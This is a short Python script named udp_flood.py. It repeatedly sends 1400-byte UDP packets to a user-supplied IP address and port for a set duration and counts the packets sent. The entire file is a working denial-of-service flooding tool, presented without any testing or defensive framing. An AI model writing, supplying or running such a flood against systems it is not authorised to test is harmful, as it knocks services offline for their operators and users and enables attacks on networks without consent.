#!/usr/bin/env python3
import socket
import time
import sys

if len(sys.argv) != 5:
    print("Usage: udp_flood.py <ip> <port> <duration_sec> <delay_sec>")
    sys.exit(1)

ip = sys.argv[1]
port = int(sys.argv[2])
duration = float(sys.argv[3])
delay = float(sys.argv[4])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = b'X' * 1400
target = (ip, port)

print(f"Flooding {ip}:{port} for {duration} seconds with {delay}s delay...")
start_time = time.time()
packets = 0

while time.time() - start_time < duration:
    try:
        sock.sendto(payload, target)
        packets += 1
        if delay > 0:
            time.sleep(delay)
    except BlockingIOError:
        pass

print(f"Done! Sent {packets} UDP packets.")